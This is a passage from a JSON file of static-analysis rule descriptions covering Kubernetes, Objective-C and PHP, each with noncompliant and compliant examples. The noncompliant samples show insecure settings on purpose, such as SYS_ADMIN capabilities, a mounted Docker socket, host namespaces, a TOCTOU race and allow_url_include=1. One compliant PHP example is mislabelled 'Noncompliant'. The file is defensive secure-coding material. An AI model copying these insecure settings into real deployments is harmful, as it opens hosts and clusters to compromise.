[\"http://example.com/\"] # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: curl\nspec:\n  template:\n    spec:\n      containers:\n      - name: curl\n        image: curlimages/curl\n        command: [\"curl\"]\n        args: [\"https://example.com/\"]\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/200\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/319\">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kubernetes:S6864": {
        "name": "Memory limits should be enforced",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>A memory limit is a configuration that sets the maximum amount of memory that a container can use. It is part of the resource management\nfunctionality of Kubernetes, which allows for the control and allocation of computational resources to containers.</p>\n<p>When a memory limit is set for a container, Kubernetes ensures that the container does not exceed the specified limit. If a container tries to use\nmore memory than its limit, the system will reclaim the excess memory, which could lead to termination of processes within the container.</p>\n<p>Without a memory limit, a container can potentially consume all available memory on a node, which can lead to unpredictable behavior of the\ncontainer or the node itself. Therefore, defining a memory limit for each container is a best practice in Kubernetes configurations. It helps in\nmanaging resources effectively and ensures that a single container does not monopolize the memory resources of a node.</p>\n<h3>What is the potential impact?</h3>\n<h4>Denial of Service</h4>\n<p>Without a memory limit, a container can consume all available memory on a node. This could lead to a Denial of Service (DoS) condition where other\ncontainers on the same node are starved of memory. These containers may slow down, become unresponsive, or even crash, affecting the overall\nfunctionality and availability of applications running on them.</p>\n<h4>Inefficient Resource Allocation</h4>\n<p>When containers lack specified resource requests, the Kubernetes scheduler may not make optimal decisions about pod placement and resource\ncontention management. This could result in the scheduler placing a resource-intensive pod on a node with insufficient resources, leading to\nperformance issues or even node failure.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>To avoid potential issues specify a memory limit for each container.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web # Noncompliant\n      image: nginx\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      resources:\n        limits:\n          memory: 100Mi\n</pre>\n<h3>How does this work?</h3>\n<p>A limit can be set through the property <code>resources.limits.memory</code> of a container. Alternatively, a default limit for a namespace can be\nset with <code>LimitRange</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Kubernetes Documentation - <a href=\"https://kubernetes.io/docs/tasks/administer-cluster/manage-resources/memory-default-namespace/\">Configure\n  Default Memory Requests and Limits for a Namespace</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6869": {
        "name": "CPU limits should be enforced",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>A CPU limitation for a container is a specified boundary or restriction that determines the maximum amount of CPU resources that a container can\nutilize. It is a part of resource management in a containerized environment, and it is set to ensure that a single container does not monopolize the\nCPU resources of the host machine.</p>\n<p>CPU limitations are important for maintaining a balanced and efficient system. They help in distributing resources fairly among different\ncontainers, ensuring that no single container can cause a system-wide slowdown by consuming more than its fair share of CPU resources.</p>\n<h3>What is the potential impact?</h3>\n<h4>Performance degradation</h4>\n<p>Without CPU limitations, a single container could monopolize all available CPU resources, leading to a system-wide slowdown. Other containers or\nprocesses on the same host might be deprived of the necessary CPU resources, causing them to function inefficiently.</p>\n<h4>System instability</h4>\n<p>In extreme cases, a container with no CPU limit could cause the host machine to become unresponsive. This can lead to system downtime and potential\nloss of data, disrupting critical operations and impacting system reliability.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web # Noncompliant\n      image: nginx\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      resources:\n        limits:\n          cpu: 0.5\n</pre>\n<h3>How does this work?</h3>\n<p>A limit can be set through the property <code>resources.limits.cpu</code> of a container. Alternatively, a default limit for a namespace can be set\nwith <code>LimitRange</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Kubernetes Documentation - <a href=\"https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/\">Resource Management for\n  Pods and Containers</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S5849": {
        "name": "Setting capabilities is security-sensitive",
        "htmlDesc": "<p>Setting capabilities can lead to privilege escalation and container escapes.</p>\n<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to processes. A thread with capabilities bypasses the\nnormal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring additional root\nprivileges.</p>\n<p>In a container, capabilities might allow to access resources from the host system which can result in container escapes. For example, with the\ncapability <code>SYS_ADMIN</code> an attacker might be able to mount devices from the host system inside of the container.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Capabilities are granted:</p>\n<ul>\n  <li> To a process that does not require all capabilities to do its job. </li>\n  <li> To a not trusted process. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary\ncapabilities are assigned.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n  - image: k8s.gcr.io/test-webserver\n    name: test-container\n    securityContext:\n      capabilities:\n        add: [\"SYS_ADMIN\"] # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n  - image: k8s.gcr.io/test-webserver\n    name: test-container\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\">Kubernetes Documentation</a> - Configure a Security\n  Context for a Pod or Container </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man7/capabilities.7.html\">Linux manual page</a> - capabilities(7) </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6429": {
        "name": "Exposing Docker sockets is security-sensitive",
        "htmlDesc": "<p>Exposing Docker sockets can lead to compromise of the host systems.</p>\n<p>The Docker daemon provides an API to access its functionality, for example through a UNIX domain socket. Mounting the Docker socket into a\ncontainer allows the container to control the Docker daemon of the host system, resulting in full access over the whole system. A compromised or rogue\ncontainer with access to the Docker socket could endanger the integrity of the whole Kubernetes cluster.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The Pod is untrusted or might contain vulnerabilities. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to never add a Docker socket as a volume to a Pod.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  containers:\n  - image: k8s.gcr.io/test-webserver\n    name: test-container\n    volumeMounts:\n    - mountPath: /var/run/docker.sock\n      name: test-volume\n  volumes:\n  - name: test-volume\n    hostPath:\n      path: /var/run/docker.sock # Sensitive\n      type: Socket\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  containers:\n  - image: k8s.gcr.io/test-webserver\n    name: test-container\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://kubernetes.io/docs/concepts/storage/volumes/#hostpath\">Kubernetes Documentation</a> - Volumes </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option\">Docker Documention</a> - Daemon socket option\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6431": {
        "name": "Using host operating system namespaces is security-sensitive",
        "htmlDesc": "<p>Using host operating system namespaces can lead to compromise of the host systems.<br> These attacks would target:</p>\n<ul>\n  <li> host processes </li>\n  <li> host inter-process communication (IPC) mechanisms </li>\n  <li> network services of the local host system </li>\n</ul>\n<p>These three items likely include systems that support either the internal operation of the Kubernetes cluster or the enterprise’s internal\ninfrastructure.</p>\n<p>Opening these points to containers opens new attack surfaces for attackers who have already successfully exploited services exposed by containers.\nDepending on how resilient the cluster is, attackers can extend their attack to the cluster by compromising the nodes from which the cluster started\nthe process.</p>\n<p>Host network sharing could provide a significant performance advantage for workloads that require critical network performance. However, the\nsuccessful exploitation of this attack vector could have a catastrophic impact on confidentiality within the cluster.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The services of this Pod are accessible to people who are not administrators of the Kubernetes cluster. </li>\n  <li> The cluster’s services performances do <strong>not</strong> rely on operating system namespaces. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not use host operating system namespaces.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      ports:\n        - name: web\n          containerPort: 80\n          protocol: TCP\n  hostPID: true     # Sensitive\n  hostIPC: true     # Sensitive\n  hostNetwork: true # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      ports:\n        - name: web\n          containerPort: 80\n          protocol: TCP\n  hostPID: false\n  hostIPC: false\n  hostNetwork: false\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/653\">CWE-653 - Improper Isolation or Compartmentalization</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6473": {
        "name": "Exposing administration services is security-sensitive",
        "htmlDesc": "<p>Exposing administrative services can lead to unauthorized access to pods or escalation of privileges inside pods.</p>\n<p>A port that is commonly used for administration services is open or marked as being open. Administration services like SSH might contain\nvulnerabilities, hard-coded credentials, or other security issues that increase the attack surface of a Kubernetes deployment. Even if the ports of\nthe services do not get forwarded to the host system, by default they are reachable from other containers in the same network. A malicious actor that\ngets access to one container could use such services to escalate access and privileges.</p>\n<p>If the administrative port is forwarded through a load balancer, then in most cases this port should be removed from the configuration to make sure\nit is not reachable externally. Setting the <code>containerPort</code> on a pod is purely informative. Therefore, removing the property is not\nsufficient to be secure. The port is still open and the service is still accessible.</p>\n<p>In both cases, it is most secure to not start any administrative services in deployments. Instead, try to access the required information using\nKubernetes’s own administrative tools. For example, to execute code inside a container, <code>kubectl exec</code> can be used. If the administration\nservice is included to access logs, Kubernetes suggests using a sidecar container with a logging agent.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The pod starts an administrative service. </li>\n</ul>\n<p>There is a risk if you answered yes to the question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Do not start SSH, VNC, RDP or similar administrative services in pods. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n    labels:\n        app: example_app\nspec:\n  containers:\n    - name: applications\n      image: my_image_with_ssh\n      ports:\n      - containerPort: 22  # NonCompliant: Merely informative, removing this property does not\n                           # close port 22.\n</pre>\n<pre>\napiVersion: apps/v1\nkind: Service\nmetadata:\n  name: example_lb\nspec:\n  type: LoadBalancer\n  ports:\n    - port: 8022\n      targetPort: 22  # Compliant\n  selector:\n    app: example_app\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://kubernetes.io/docs/concepts/cluster-administration/logging/#sidecar-container-with-logging-agent\">Kubernetes</a> - Logging\n  Architecture: Using a sidecar container with the logging agent </li>\n  <li> <a href=\"https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/\">Kubernetes</a> - Get a Shell to a Running\n  Container </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kubernetes:S6870": {
        "name": "Storage limits should be enforced",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Ephemeral storage is a type of storage that is temporary and non-persistent, meaning it does not retain data once the process is terminated. In the\ncontext of Kubernetes, ephemeral storage is used for storing temporary files that a running container can write and read.</p>\n<p>The issue at hand pertains to the creation of a container without any defined limits for this ephemeral storage. This means that the container can\npotentially consume as much ephemeral storage as is available on the node where it is running.</p>\n<h3>What is the potential impact?</h3>\n<h4>Resource exhaustion</h4>\n<p>Without a defined limit, a container can consume all available ephemeral storage on a node. This can lead to resource exhaustion, where no more\nstorage is available for other containers or processes running on the same node. This could cause these other containers or processes to fail or\nperform poorly.</p>\n<h4>Unpredictable application behavior</h4>\n<p>If a container exhausts the available ephemeral storage, it can lead to unpredictable application behavior. For instance, if an application\nattempts to write to the ephemeral storage and there is no space left, it may crash or exhibit other unexpected behaviors.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web # Noncompliant\n      image: nginx\n      volumeMounts:\n        - name: ephemeral\n          mountPath: \"/tmp\"\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      resources:\n        limits:\n          ephemeral-storage: \"2Gi\"\n      volumeMounts:\n        - name: ephemeral\n          mountPath: \"/tmp\"\n</pre>\n<h3>How does this work?</h3>\n<p>A limit can be set through the property <code>resources.limits.ephemeral-storage</code> of a container. Alternatively, a default limit for a\nnamespace can be set with <code>LimitRange</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Kubernetes Documentation - <a href=\"https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/\">Resource Management for\n  Pods and Containers</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6430": {
        "name": "Allowing process privilege escalations is security-sensitive",
        "htmlDesc": "<p>Allowing process privilege escalations exposes the Pod to attacks that exploit setuid binaries.</p>\n<p>This field directly controls whether the <code>no_new_privs</code> flag is set in the container process.<br> When this flag is enabled, binaries\nconfigured with setuid or setgid bits cannot change their runtime uid or gid: Potential attackers must rely on other privilege escalation techniques\nto successfully operate as root on the Pod.</p>\n<p>Depending on how resilient the Kubernetes cluster and Pods are, attackers can extend their attack to the cluster by compromising the nodes from\nwhich the cluster started the Pod.</p>\n<p>The <code>allowPrivilegeEscalation</code> field should not be set to true unless the Pod’s risks related to setuid or setgid bits have been\nmitigated.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Pod is accessible to people who are not administrators of the Kubernetes cluster. </li>\n  <li> This Pod contains binaries with setuid or setgid capabilities. </li>\n</ul>\n<p>There is a risk if you answered yes to all of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Disable privilege escalation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      ports:\n        - name: web\n          containerPort: 80\n          protocol: TCP\n      securityContext:\n        allowPrivilegeEscalation: true # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      ports:\n        - name: web\n          containerPort: 80\n          protocol: TCP\n      securityContext:\n        allowPrivilegeEscalation: false\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt\">Linux Kernel Archives, no_new_privs</a> - Official docs </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5847": {
        "name": "Accessing files should not introduce TOCTOU vulnerabilities",
        "htmlDesc": "<p>When an application manipulates files, \"Time-Of-Check to Time-Of-Use\" can occur when a file-checking operation is disconnected from the actual\noperation it is bound to.</p>\n<p>For example, such a vulnerability occurs when a file existence check is performed strictly before a file creation operation.</p>\n<h2>Why is this an issue?</h2>\n<p>Race conditions can happen when file operations and their associated pre-checks are disconnected. Indeed, while the application assumes that the\nchecked file property will not change before performing the operation, there is a chance that changes are applied to the file.</p>\n<p>Especially, a concurrent process, which an attacker can control, could modify a file right after a check is performed and before the actual use.\nThis file can be deleted, created, altered, or see its permissions changed depending on the use case.</p>\n<h3>What is the potential impact?</h3>\n<p>The impact of a successfully exploited race condition is dependent on the business logic of the vulnerable application. The consequences will vary\ndepending on what check is performed and how the file is used.</p>\n<p>In general, attackers use such attacks to escalate privileges, execute arbitrary code, or perform a denial of service.</p>\n<h4>Arbitrary code execution</h4>\n<p>Executable or script file integrity and authenticity checks can be bypassed when exploiting a TOCTOU vulnerability. In such a scenario, attackers\nwould change an executable file content between when its integrity is checked and when the application executes it.</p>\n<p>This attack would allow attackers to trick the application into executing malicious, arbitrary code. They would then be granted the same privilege\nlevels as the application itself, which can be particularly severe when it runs with administration privileges.</p>\n<h4>Privileges escalation</h4>\n<p>When the attacker is a local user on the same server as the running application, the same attack is possible with extended probability. In such a\ncase, attackers can exploit the reading and writing to configuration files, the creation of local network resources, or the use of temporary files to\nachieve the same code execution purpose.</p>\n<p>However, in that case, the attack is only meaningful when the application is running with high or otherwise interesting privileges. Attackers\nexploiting a TOCTOU vulnerability that way would achieve horizontal or vertical privilege escalation.</p>\n<h4>Denial of service</h4>\n<p>When the application expects some file properties to be set at the operation time, it will often face unexpected errors when those properties have\nactually changed. This might be the case when writing to a file where newly set permissions forbid that operation or when reading from a deleted\nfile.</p>\n<p>When such errors are faced, the application might unexpectedly stop, which can affect its availability. Depending on the application and hosting\narchitectures, the interruption can be temporary or permanent, partial or complete.</p>\n<h2>How to fix it</h2>\n<p>To prevent TOCTOU race condition issues, best practices recommend relying on file operations that can perform the necessary preliminary checks\natomically. For example, file opening functions usually accept a parameter to check the file exists and return an error depending on the result. This\ncheck is atomic and is not susceptible to race conditions.</p>\n<p>When this is not possible, it might be possible to open a file directly, and to keep a reference to it for later use. If the conditions are set for\nthe subsequent operations, the application can continue with its processing and use the open file pointer to read or write to the file. In the\nopposite case, an error might be raised that will need to be properly handled.</p>\n<p>To finish, for most complex operations, the application can create a dedicated working directory and set tight permissions on it. This needs to be\nperformed atomically to prevent further race conditions. All subsequent sensitive file operations can then be performed in this dedicated\ndirectory.</p>\n<p>Note that this last solution is imperfect and is still susceptible to race condition attacks from privileged users and the application itself. It\nshould be used when no other countermeasure is acceptable.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code sample is susceptible to a race condition attack because it checks a file exists strictly before it opens it for writing.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFILE *fopen_if_not_exists(const char *file) {\n  if (access(file, F_OK) == -1 &amp;&amp; errno == ENOENT) {\n    FILE *f = fopen(file, \"w\"); // Noncompliant\n\n    return f;\n  }\n\n  return nullptr;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFILE *fopen_if_not_exists(const char *file) {\n  FILE *f = fopen(file, \"wx\");\n  return f;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Here, the compliant code example uses an atomic operation to open the file and check for its existence beforehand.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Carnegie Mellon University Software Engineering Institure - <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files\">FIO45-C. - Avoid TOCTOU race\n  conditions while accessing files</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/367\">CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S3334": {
        "name": "\"allow_url_fopen\" and \"allow_url_include\" should be disabled",
        "htmlDesc": "<p>File access functions in PHP are typically used to open local files. They are also capable of reading files from remote servers using protocols\nsuch as HTTP, HTTPS and FTP.</p>\n<p>This behavior is controlled by the <code>allow_url_fopen</code> and <code>allow_url_include</code> settings.</p>\n<h2>Why is this an issue?</h2>\n<p>Most applications do not require or expect the file access functions to download remotely accessible files. However, attackers can abuse these\nremote file access features while exploiting other vulnerabilities, such as path traversal issues.</p>\n<h3>What is the potential impact?</h3>\n<p>While activating these settings does not pose a direct threat to the application’s security, they can make the exploitation of other\nvulnerabilities easier and more severe.</p>\n<p>If an attacker can control a file location while <code>allow_url_fopen</code> is set to <code>1</code>, they can use this ability to perform a\nServer-Side Request Forgery exploit. This allows the attacker to affect more than just the local application and they may be able to laterally attack\nother assets on the local network.</p>\n<p>If <code>allow_url_include</code> is set to <code>1</code>, the attacker will also have the ability to download and execute arbitrary PHP code.</p>\n<h2>How to fix it</h2>\n<p><code>allow_url_fopen</code> and <code>allow_url_include</code> should be deactivated in the main PHP configuration file. Note that\n<code>allow_url_include</code> is disabled by default while <code>allow_url_fopen</code> is not and must be explicitly disabled.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n; php.ini  Noncompliant; allow_url_fopen is enabled by default\nallow_url_include=1  ; Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n; php.ini\nallow_url_fopen=0\nallow_url_include=0\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/829\">CWE-16 - Inclusion of Functionality from Untrusted Control Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S3335": {
        "name": "\"cgi.force_redirect\" should be enabled",
        "htmlDesc": "<p>The <code>cgi.force_redirect</code> <em>php.ini</em> configuration controls the behavior of the PHP engine when used in CGI mode. In particular, it\nprevents CGI scripts from being directly requested without prior web server or application processing.</p>\n<p>When disabled, CGI scripts can be requested directly.</p>\n<h2>Why is this an issue?</h2>\n<p>Pre-processing on the server side is often required to check users authentication when working in CGI mode. Those preliminary actions can also\nposition diverse configuration parameters necessary for the CGI script to work correctly.</p>\n<h3>What is the potential impact?</h3>\n<p>CGI scripts might behave unexpectedly if the proper configuration is not set up before they are accessed.</p>\n<p>Most serious security-related consequences will affect the authorization and authentication mechanisms of the application. When the web server is\nresponsible for authenticating clients and forwarding the proper identity to the script, direct access will bypass this authentication step.</p>\n<p>Attackers could also provide arbitrary identities to the CGI script by forging specific HTTP headers or parameters. They could then impersonate any\nlegitimate user of the application.</p>\n<h2>How to fix it</h2>\n<p><code>cgi.force_redirect</code> should be enforced in the main PHP configuration file.</p>\n<p>Note that this parameter is enabled by default.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n; php.ini\ncgi.force_redirect=0  ; Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n; php.ini\ncgi.force_redirect=1  ; Noncompliant\n</pre>\n<h3>Pitfalls</h3>\n<p>The <code>cgi.force_redirect</code> is not supported by all web servers. For example, Microsoft IIS web server is unable to differentiate an\ninternally redirected request from a normal one.</p>\n<p>While using such a server, the <code>cgi.force_redirect</code> parameter will have to be disabled for the CGI scripts to work properly. In that\ncase, it is important to ensure the CGI behavior is aware of the security threat.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/305\">CWE-305 - Authentication Bypass by Primary Weakness</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S3336": {
        "name": "\"session.use_trans_sid\" should not be enabled",
        "htmlDesc": "<p>PHP session tokens are normally transmitted through HTTP cookies. However, for clients that do not support cookies and when the PHP\n<code>session.use_trans_sid</code> setting is enabled, those tokens can be transmitted as URL parameters.</p>\n<h2>Why is this an issue?</h2>\n<p>GET URL parameter can be disclosed in a variety of ways:</p>\n<ul>\n  <li> Directly in a web browser address bar. </li>\n  <li> In navigation history. </li>\n  <li> In web servers or intermediate proxies log files. </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Attackers with access to any of those disclosure locations will be able to see and steal a victim’s session token. They can then use it to log in\nas the user, impersonate their account, and take advantage of their privileges.</p>\n<p>Such an attack can be more or less severe depending on the victim’s privileges. Common security impacts range from data theft to application\ntakeover.</p>\n<h4>Data theft</h4>\n<p>Attackers with access to a compromised account will be able to disclose any information stored on it. This includes the Personally Identifiable\nInformation (PII) of the user.</p>\n<p>The confidentiality of PII is a requirement from national security regulatory authorities in most countries. Insufficiently protecting this data\ncould have legal consequences and lead to fines or other prosecutions.</p>\n<h4>Application takeover</h4>\n<p>Attackers compromise the account of a high-privileged user could modify internal web application logic, disrupt workflows, or change other\napplication’s settings in a way that will give them full control over it.</p>\n<p>Such an attack would lead to reputational damages and financial and legal consequences.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n; php.ini\nsession.use_trans_sid=1  ; Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n; php.ini\nsession.use_trans_sid=0\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant code example disables the <code>session.use_trans_sid</code> setting.</p>\n<p>Note that this parameter is off by default.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S3337": {
        "name": "\"enable_dl\" should be disabled",
